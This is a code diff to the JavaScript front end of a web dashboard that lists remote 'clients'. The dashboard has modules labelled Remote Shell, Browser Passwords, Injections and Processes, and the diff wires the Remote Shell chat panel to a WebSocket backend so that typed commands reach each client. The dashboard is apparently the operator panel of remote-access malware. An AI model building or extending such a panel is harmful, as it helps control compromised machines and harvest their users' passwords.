@@ -508,9 +508,15 @@
   /* 2) Activate client => create tab + detail panel from JSON */
   function activateClient(clientName) {
     const existingTab = document.querySelector(`.tab[data-tab="${clientName}"]`);
+    const card = document.querySelector(`.client-card[data-client-name="${clientName}"]`);
+
     if (existingTab) {
       // Already have a tab
       return;
+    }
+
+    if (card) {
+      card.style.border = "3px solid #006fa1";
     }
 
     // Create a new tab
@@ -548,8 +554,8 @@
       <div class="navbar">
         <h3 class="optionHeader" id="optionHeader-${clientName}"></h3>
         <div class="dropdown modules">
-          <button class="remoteShellButton" onclick="switchViewBasedOnModule('${clientName}', 'remoteShellButton')">Remote Shell</button>
           <button class="machineInfoButton active" onclick="switchViewBasedOnModule('${clientName}', 'machineInfoButton')">Machine Info</button>
+          <button class="remoteShellButton" onclick="switchViewBasedOnModule('${clientName}', 'remoteShellButton')">Remote Shell</button>
           <button class="browserPassButton">Browser Passwowrds</button>
           <button class="injectionsButton">Injections</button>
           <button class="processesButton">Processes</button>
@@ -634,7 +640,7 @@
 
     moduleOptionHeader.textContent = `${clientName} Remote Shell`;
 
-    // Rebuild the shell panel, but we won't lose messages since they're in chatHistory
+    // Rebuild the shell panel
     clientRow.innerHTML = `
       <div class="chat-slide-panel" id="chatPanel-${clientName}">
         <div class="chat-slide-header">
@@ -655,16 +661,31 @@
             Send
           </button>
         </div>
-      </div>`;
+      </div>
+    `;
+    
+    const input = document.getElementById(`chatInput-${clientName}`);
+    const button = document.querySelector(".chat-send-btn");
 
-    // If we don't have a history array yet, create it
+      input.addEventListener("keydown", (event) => {
+        if (event.key === "Enter") {
+          button.click(); // Trigger the button click
+        }
+      });
+
+
+    // If no history, create an empty array
     if (!chatHistory[clientName]) {
       chatHistory[clientName] = [];
     }
 
-    // Now re-render existing messages (if any)
+    // Open or reuse the socket for this client
+    getOrCreateSocket(clientName);
+
+    // Render existing chat (if any)
     renderChatHistory(clientName);
   }
+
 
   /* Called when user hits "Send" in the chat */
   function sendCommand(clientName) {
@@ -674,62 +695,82 @@
     const userCmd = input.value.trim();
     if (!userCmd) return;
 
-    // 1) Push the user's command
+    // 1) Push the user's command to chatHistory so it appears in the UI immediately
     if (!chatHistory[clientName]) {
       chatHistory[clientName] = [];
     }
     chatHistory[clientName].push({ role: 'user', text: userCmd });
 
-    // 2) Simulate a response
-    chatHistory[clientName].push({ role: 'bot', text: 'Hello World' });
-
-    // 3) Re-render chat
+    // Re-render chat so we see the user's message
     renderChatHistory(clientName);
 
-    // 4) Clear input
+    // 2) Send the command over WebSocket to the Django backend
+    const socket = getOrCreateSocket(clientName);
+    socket.send(JSON.stringify({ command: userCmd }));
+
+    // 3) Clear the input field
     input.value = '';
   }
+
 
   /* -------------- End In-memory Chat -------------- */
 
 
   /* Show All Clients => revert to original card view */
+  
   function showAllClients() {
+    // Remove 'active' style from all tabs/panels
     document.querySelectorAll('.tab').forEach((tab) => tab.classList.remove('active'));
     document.querySelectorAll('.active-client-tab').forEach((p) => p.classList.remove('active'));
     const allClientsTab = document.querySelector('.tab[data-tab="all-clients"]');
     if (allClientsTab) allClientsTab.classList.add('active');
 
-    // Show all client cards
+    // 1) Show all client cards
+    // 2) Remove the 3px border (if you want) from all cards
     document.querySelectorAll('.client-card').forEach((card) => {
       card.style.display = 'flex';
-      card.style.border = '';
+      // optional: card.style.border = "";
     });
   }
 
+
   /* Open a specific client tab => hide cards, show detail */
   function openTab(clientName) {
+  // 1) Hide all cards & tabs/panels
     document.querySelectorAll('.client-card').forEach((c) => (c.style.display = 'none'));
     document.querySelectorAll('.tab').forEach((t) => t.classList.remove('active'));
     document.querySelectorAll('.active-client-tab').forEach((p) => p.classList.remove('active'));
 
+    // 2) Mark the clicked tab active
     const selectedTab = document.querySelector(`.tab[data-tab="${clientName}"]`);
     if (selectedTab) selectedTab.classList.add('active');
 
+    // 3) Show the associated detail panel
     const selectedPanel = document.querySelector(`.active-client-tab[data-client="${clientName}"]`);
     if (selectedPanel) selectedPanel.classList.add('active');
   }
 
+
   /* Close the tab */
   function closeTab(clientName) {
+    // Remove the tab from DOM
     const tabToRemove = document.querySelector(`.tab[data-tab="${clientName}"]`);
     if (tabToRemove) tabToRemove.remove();
 
+    // Remove the detail panel
     const panelToRemove = document.querySelector(`.active-client-tab[data-client="${clientName}"]`);
     if (panelToRemove) panelToRemove.remove();
 
+    // Remove the blue border from the card
+    const card = document.querySelector(`.client-card[data-client-name="${clientName}"]`);
+    if (card) {
+      card.style.border = "";
+    }
+
+    // Show "All Clients"
     showAllClients();
   }
+
 
   function toggleActiveModules(clientName) {
     const detailDiv = document.querySelector(`[data-client="${clientName}"]`);
@@ -742,6 +783,65 @@
       });
     });
   }
+
+  // Keep a map of WebSocket connections keyed by clientName
+  let socketMap = {};
+
+  function getOrCreateSocket(clientName) {
+    // If we already have a socket for this client, return it
+    if (socketMap[clientName]) {
+      return socketMap[clientName];
+    }
+
+    // Otherwise, create a new one
+    const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+    // If you're literally using "Machine1" as the agent_id on the server, then:
+    const socketUrl = `${protocol}//${window.location.host}/ws/shell/${clientName}/`;
+    console.log(socketUrl);
+    
+    const newSocket = new WebSocket(socketUrl);
+
+    // Handle open event
+    newSocket.onopen = () => {
+      console.log('WebSocket connected for:', clientName);
+      // Optionally send a greeting or handshake message:
+      // newSocket.send(JSON.stringify({ greeting: "Hello from client" }));
+    };
+
+    // Handle incoming messages
+    newSocket.onmessage = (event) => {
+      const data = JSON.parse(event.data);
+      const serverMessage = data.message;
+
+      // If chatHistory for this client doesn't exist, initialize it
+      if (!chatHistory[clientName]) {
+        chatHistory[clientName] = [];
+      }
+
+      // We treat server messages as role='bot'
+      chatHistory[clientName].push({ role: 'bot', text: serverMessage });
+
+      // Re-render the chat to show the new message
+      renderChatHistory(clientName);
+    };
+
+    // Handle errors
+    newSocket.onerror = (error) => {
+      console.error('WebSocket error:', error);
+    };
+
+    // Handle close
+    newSocket.onclose = (event) => {
+      console.log('WebSocket closed for:', clientName, event.reason);
+      // Remove from the map if needed or attempt reconnection
+      delete socketMap[clientName];
+    };
+
+    // Store the new socket in our map
+    socketMap[clientName] = newSocket;
+    return newSocket;
+  }
+
 
   /* Optional toggleChat animation logic (unused in this approach) */
   function toggleChat(clientName) {
